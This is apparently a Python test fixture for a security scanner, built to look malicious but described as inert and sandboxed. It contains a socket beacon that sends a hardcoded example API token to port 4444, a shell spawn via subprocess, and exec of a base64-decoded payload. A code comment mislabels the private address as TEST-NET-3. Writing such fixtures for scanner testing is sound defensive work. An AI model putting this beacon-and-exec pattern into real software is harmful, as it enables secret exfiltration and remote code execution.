"""TEST FIXTURE ONLY — a deliberately malicious-looking sample for the Part-3 scanner.

It is INERT in practice: it is executed *only* inside the hardened, `--network=none`,
read-only Docker sandbox, where the outbound socket is blocked and recorded, the target
is a non-routable address, and the decoded payload is a no-op. It exists so the static
scanners flag the dangerous constructs (socket, subprocess, base64-exec, hardcoded
secret) and the dynamic pass records a blocked network attempt. NEVER run on the host.
"""

import base64
import socket
import subprocess

API_TOKEN = "AKIAIOSFODNN7EXAMPLE"  # hardcoded-secret pattern for the secrets sweep

# base64 of: pass  (an inert no-op payload)
_PAYLOAD = base64.b64decode(b"cGFzcw==")


def _beacon() -> None:
    # blocked by --network=none; target is non-routable (TEST-NET-3 / reserved)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect(("10.255.255.1", 4444))  # exfil beacon attempt
        s.sendall(API_TOKEN.encode())
    finally:
        s.close()


def _run() -> None:
    subprocess.Popen(["/bin/sh", "-c", "id"])  # untrusted subprocess spawn
    exec(compile(_PAYLOAD, "<payload>", "exec"))  # dynamic code execution


if __name__ == "__main__":
    _beacon()
    _run()
